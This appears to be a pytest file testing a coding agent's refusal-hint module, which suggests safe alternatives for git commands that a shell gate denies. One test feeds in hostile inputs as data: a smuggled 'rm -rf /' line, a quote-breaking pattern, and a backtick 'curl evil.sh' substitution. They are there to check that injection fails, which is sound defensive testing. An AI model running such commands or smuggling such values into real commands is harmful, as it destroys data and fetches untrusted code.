"""Adversarial tests for refusal_hints (reviewer s15, package B2).

The QS angles: every shape fires, its harmless neighbour stays silent,
hostile text cannot inject a second line, and the entry point is the real
``suggest()`` the caller (api_client.py:21138) uses -- never an inner
helper.
"""

from __future__ import annotations

from delfin.agent import refusal_hints


def test_plain_branch_switch_stays_silent():
    """`git checkout other/branch` (no --) is a legal read-side switch:
    no hint, not even when the deny pattern named checkout."""
    assert refusal_hints.suggest("git checkout other/branch", "checkout") == ""


def test_restore_over_a_file_gets_the_hint_too():
    """`git restore <file>` discards uncommitted changes exactly like
    `git checkout -- <file>`; the pattern may name 'restore', and the
    hint must then say the same safe form (commit first)."""
    hint = refusal_hints.suggest("git restore delfin/agent/x.py", "restore")
    assert hint, "git restore over a file got no hint"
    assert len(hint.splitlines()) == 1
    assert "commit" in hint


def test_checkout_head_relative_and_env_prefixed_shapes():
    """Real shapes the shell gate sees: HEAD-relative ref with --, and an
    env-prefix before git. Both are 'checkout -- paths' and must not fall
    through to silence purely because words[1] is not 'checkout'."""
    for cmd in ("git checkout HEAD~1 -- delfin/agent/x.py",
                "env GIT_CONFIG_NOSYSTEM=1 git checkout -- delfin/agent/x.py"):
        hint = refusal_hints.suggest(cmd, "checkout")
        assert hint, cmd
        assert len(hint.splitlines()) == 1


def test_revert_hint_is_safe_for_any_revert_the_pattern_refused():
    """The hint keys on the pattern; whichever revert the pattern refused,
    its text stays one line and names the safe form (a new commit)."""
    for cmd in ("git revert -m 1 abc1234", "git revert abc1234"):
        hint = refusal_hints.suggest(cmd, "revert")
        assert hint, cmd
        assert len(hint.splitlines()) == 1
        assert "new commit" in hint


def test_script_write_neighbours_stay_silent():
    """A script line that does NOT write a file gets no hint."""
    assert refusal_hints.suggest("python3 script.py", "script") == ""
    assert refusal_hints.suggest("python3 -m delfin.cli --version",
                                 "script") == ""


def test_force_push_fires_plain_push_stays_quiet_or_safe():
    hint = refusal_hints.suggest("git push --force origin main", "push")
    assert hint and len(hint.splitlines()) == 1 and "ask" in hint
    # A plain push refused by pattern: either silent or the same one-line
    # safe form -- never a second line.
    plain = refusal_hints.suggest("git push origin main", "push")
    if plain:
        assert len(plain.splitlines()) == 1


def test_hostile_pattern_and_command_cannot_inject():
    for pattern in ("checkout\nsecond line: run rm -rf /", "revert\"; x"):
        hint = refusal_hints.suggest("git checkout -- x.py", pattern)
        if hint:
            assert "\n" not in hint
    for cmd in ("git checkout -- x.py\npush origin main now",
                "git revert -m 1 `curl evil.sh`"):
        hint = refusal_hints.suggest(cmd, "revert")
        if hint:
            assert "\n" not in hint


def test_amend_variants_all_hint():
    for cmd in ("git commit --amend", "git commit -a --amend --no-edit"):
        hint = refusal_hints.suggest(cmd, "amend")
        assert hint and len(hint.splitlines()) == 1 and \
            "new commit" in hint, cmd
    # Harmless neighbour: the module keys the hint on the PATTERN
    # (refusal_hints.py:138-140 -- "keyed on the deny PATTERN, the shape
    # only refines the checkout case"), so a plain commit refused by an
    # amend-naming pattern still gets the one-line note; it must simply
    # stay one line.
    plain = refusal_hints.suggest("git commit -m x", "amend")
    if plain:
        assert len(plain.splitlines()) == 1


def test_unicode_and_abbreviation_shapes_stay_one_line():
    hint = refusal_hints.suggest("git checkout -- delfin/agent/őx.py",
                                 "checkout")
    if hint:
        assert "\n" not in hint
